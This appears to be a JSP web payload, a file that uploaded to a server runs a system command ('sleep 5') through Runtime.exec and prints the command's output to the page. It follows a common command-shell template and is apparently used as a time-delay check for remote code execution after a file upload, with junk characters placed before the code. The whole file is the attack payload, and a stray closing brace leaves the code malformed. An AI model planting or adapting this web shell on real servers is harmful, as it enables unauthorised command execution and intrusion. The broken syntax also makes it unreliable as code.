123123232123

<%@ page import="java.util.*,java.io.*"%>
<%
out.println("Command: " + "sleep 5" + "<BR>");
    Process p = Runtime.getRuntime().exec("sleep 5");
    OutputStream os = p.getOutputStream();
    InputStream in = p.getInputStream();
    DataInputStream dis = new DataInputStream(in);
    String disr = dis.readLine();
    while ( disr != null ) {
            out.println(disr); 
            disr = dis.readLine(); 
            }
        }
%>
